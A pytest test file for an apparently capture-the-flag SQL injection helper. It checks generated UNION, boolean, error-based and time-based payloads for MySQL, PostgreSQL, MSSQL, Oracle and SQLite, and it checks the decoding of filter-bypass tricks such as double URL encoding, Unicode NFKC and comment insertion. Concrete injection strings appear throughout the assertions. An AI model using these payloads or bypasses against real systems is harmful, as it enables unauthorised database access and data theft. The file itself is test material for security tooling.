"""Synthetic, offline tests for solvers/web/sqli_helper.py."""

import json

import pytest

import sqli_helper as sqli


def _find(rows, technique, variant):
    return next(row for row in rows if row["technique"] == technique and row["variant"] == variant)


def test_mysql_plan_uses_known_column_count_and_reflected_position():
    rows = sqli.generate_payloads(
        3, context="string", dialect="mysql", reflected_column=2, marker="MARK"
    )
    union = _find(rows, "union", "reflected_marker")
    assert union["payload"] == "' UNION ALL SELECT NULL,'MARK',NULL -- "
    assert union["rank"] == 1
    assert union["available"] is True
    assert _find(rows, "error", "version_leak")["payload"].startswith("' AND EXTRACTVALUE")


def test_boolean_and_time_payloads_are_control_pairs():
    rows = sqli.generate_payloads(1, context="numeric", dialect="postgresql", delay=4)
    true = _find(rows, "boolean", "true")
    false = _find(rows, "boolean", "false")
    assert true["control_pair"] == false["control_pair"] == "boolean-7"
    assert true["payload"].startswith(" AND 7=7")
    assert false["payload"].startswith(" AND 7=8")
    time_true = _find(rows, "time", "true")
    time_false = _find(rows, "time", "false")
    assert time_true["control_pair"] == time_false["control_pair"] == "time-4s"
    assert "pg_sleep(4)" in time_true["payload"]
    assert "7=8" in time_false["payload"]


@pytest.mark.parametrize(
    ("dialect", "error_token", "time_token"),
    [
        ("mysql", "EXTRACTVALUE", "SLEEP"),
        ("postgresql", "CAST", "pg_sleep"),
        ("mssql", "CONVERT", "WAITFOR"),
        ("oracle", "DRITHSX", "DBMS_PIPE"),
    ],
)
def test_database_specific_error_and_time_families(dialect, error_token, time_token):
    rows = sqli.generate_payloads(2, dialect=dialect)
    assert error_token in _find(rows, "error", "version_leak")["payload"]
    assert time_token in _find(rows, "time", "true")["payload"]


def test_sqlite_and_generic_label_nonportable_families_unavailable():
    for dialect in ("sqlite", "generic"):
        rows = sqli.generate_payloads(2, dialect=dialect)
        assert _find(rows, "union", "reflected_marker")["available"] is True
        assert _find(rows, "boolean", "true")["available"] is True
        assert _find(rows, "error", "version_leak")["available"] is False
        assert _find(rows, "time", "true")["available"] is False


def test_context_and_exact_injection_point_overrides():
    oracle = sqli.generate_payloads(2, context="string_paren", dialect="oracle")
    assert _find(oracle, "union", "reflected_marker")["payload"].startswith("') UNION")
    assert " FROM dual" in _find(oracle, "union", "reflected_marker")["payload"]
    mssql = sqli.generate_payloads(1, dialect="mssql", marker="O'Brien")
    assert "N'O''Brien'" in _find(mssql, "union", "reflected_marker")["payload"]
    custom = sqli.generate_payloads(1, dialect="mysql", close="'))", comment="#")
    assert _find(custom, "union", "reflected_marker")["payload"].startswith("')) UNION")
    assert _find(custom, "union", "reflected_marker")["payload"].endswith(" #")


def test_combined_double_url_nfkc_and_comment_decode():
    encoded = "ＵＮ/**/ＩＯＮ%2520ＳＥＬ/**/ＥＣＴ%2520%2527x%2527"
    result = sqli.decode_filter_bypasses(encoded)
    assert result["canonical"] == "UNION SELECT 'x'"
    assert result["bypasses"] == [
        "double_url_encoding", "unicode_nfkc", "comment_insertion"
    ]
    assert result["url_decode_rounds"] == 2
    assert result["comment_counts"]["block"] == 2
    assert result["keywords"] == ["UNION", "SELECT"]
    assert [stage["method"] for stage in result["candidates"]] == [
        "input", "url_decode_1", "url_decode_2", "unicode_nfkc", "sql_comment_decode"
    ]


def test_mysql_executable_comment_preserves_code_body():
    result = sqli.decode_filter_bypasses("/*!50000UNION*/%20SEL/**/ECT")
    assert result["canonical"] == "UNION SELECT"
    assert result["comment_counts"] == {"mysql_executable": 1, "block": 1, "line": 0}
    assert "mysql_executable_comment" in result["bypasses"]


def test_form_url_variant_is_reported_without_destroying_literal_plus():
    result = sqli.decode_filter_bypasses("UNION+SELECT%20'a'")
    assert result["canonical"] == "UNION+SELECT 'a'"
    assert result["form_url_variant"] == "UNION SELECT 'a'"
    assert result["form_url_stages"][-1]["value"] == "UNION SELECT 'a'"


def test_nested_form_url_encoding_is_decoded_in_its_own_bounded_branch():
    result = sqli.decode_filter_bypasses("UNION%252BSELECT")
    assert result["canonical"] == "UNION+SELECT"
    assert result["form_url_variant"] == "UNION SELECT"
    assert [row["value"] for row in result["form_url_stages"]] == [
        "UNION%2BSELECT", "UNION+SELECT", "UNION SELECT",
    ]


def test_limits_and_invalid_positions_are_rejected():
    with pytest.raises(ValueError, match="between 1 and 128"):
        sqli.generate_payloads(0)
    with pytest.raises(ValueError, match="within"):
        sqli.generate_payloads(2, reflected_column=3)
    with pytest.raises(ValueError, match="between 1 and 30"):
        sqli.generate_payloads(1, delay=60)


def test_cli_json_is_machine_readable(capsys):
    assert sqli.main([
        "generate", "--columns", "2", "--dialect", "mysql", "--json"
    ]) == 0
    plan = json.loads(capsys.readouterr().out)
    assert plan[0]["offline"] is True
    assert plan[0]["technique"] == "union"

    assert sqli.main(["decode", "%2527", "--json"]) == 0
    decoded = json.loads(capsys.readouterr().out)
    assert decoded["canonical"] == "'"
    assert decoded["url_decode_rounds"] == 2

